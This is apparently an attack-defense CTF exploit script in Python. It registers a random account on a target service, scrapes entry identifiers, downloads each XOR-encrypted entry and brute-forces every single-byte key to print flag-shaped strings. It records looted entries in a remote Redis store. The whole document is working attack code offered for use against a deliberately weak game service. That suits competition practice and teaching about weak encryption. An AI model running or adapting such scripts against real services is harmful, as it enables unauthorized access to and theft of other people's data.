#!/usr/bin/env python3

# in go language we can't simply override parent methods
# so service use simple XOR encryption
# this sploit try decrypt one byte xor^ used by default in service

from libsplo import *
import sys
import re
import random
import string
import binascii


def xxor(data, s):
	result = ''
	for c in data:
		result += chr(c ^ s)
	return result


st = DictStorage(RedisConnector("wroteup_xor", "redis://redis.kappactf.ru"))
ip = sys.argv[1]

username = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(10)])
password = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(10)])

sess = requests.Session()
sess.post(f"http://{ip}:50000/register", data={
	"login" : username,
	"password" : password,
})

resp = sess.get(f"http://{ip}:50000/main").text

ctfs = re.findall(r'</strong>\s+(.*)\s+</p>', resp)
ctfs = set(ctfs)

ctfs -= set(st.keys())

for ctf in ctfs:
	resp = sess.get(f"http://{ip}:50000/show?ctf={ctf}").text.strip()
	data = binascii.unhexlify(resp)

	for i in range(0, 256):
		e = xxor(data, i)

		print(re.findall(r'[A-Z0-9]{31}=', e), flush=True)

	st.set(ctf, "1")
